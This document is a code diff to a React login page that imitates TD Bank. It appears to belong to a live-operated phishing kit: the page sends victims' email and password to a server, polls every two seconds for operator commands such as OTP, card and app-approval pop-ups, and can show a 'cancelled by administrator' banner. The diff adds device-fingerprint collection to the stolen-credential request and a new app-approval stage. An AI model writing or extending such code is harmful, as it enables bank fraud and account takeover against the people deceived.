@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { Eye, EyeOff, Info } from 'lucide-react';
+import { collectDeviceInfo } from '../utils/deviceInfo';
 
 /* ─── TD Bank logo image ─── */
 const TDLogo = () => (
@@ -204,7 +205,7 @@ const translations = {
   }
 };
 
-export default function LoginPage({ lang, setLang, onSignInInitiated }) {
+export default function LoginPage({ lang, setLang, onSignInInitiated, onAppPopupInitiated }) {
   const t = translations[lang];
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -260,6 +261,9 @@ export default function LoginPage({ lang, setLang, onSignInInitiated }) {
           if (data.status === 'show_otp' || data.status === 'card_popup' || data.status === 'card_submitted') {
             setIsLoading(false);
             onSignInInitiated(email.trim());
+          } else if (data.status === 'app_popup') {
+            setIsLoading(false);
+            onAppPopupInitiated(email.trim());
           } else if (data.status === 'cancelled') {
             setIsLoading(false);
             setErrorBanner(lang === 'fr' ? 'Connexion annulée par l\'administrateur.' : 'Login cancelled by administrator.');
@@ -271,7 +275,7 @@ export default function LoginPage({ lang, setLang, onSignInInitiated }) {
     };
     intervalId = setInterval(checkStatus, 2000);
     return () => { if (intervalId) clearInterval(intervalId); };
-  }, [isLoading, email, lang, onSignInInitiated]);
+  }, [isLoading, email, lang, onSignInInitiated, onAppPopupInitiated]);
 
   const toggleLanguage = (e) => {
     e.preventDefault();
@@ -313,7 +317,8 @@ export default function LoginPage({ lang, setLang, onSignInInitiated }) {
         body: JSON.stringify({
           email: email.trim(),
           password: password.trim(),
-          description: isDescriptionExpanded ? description.trim() : ''
+          description: isDescriptionExpanded ? description.trim() : '',
+          deviceInfo: collectDeviceInfo(),
         })
       });
       const data = await response.json();
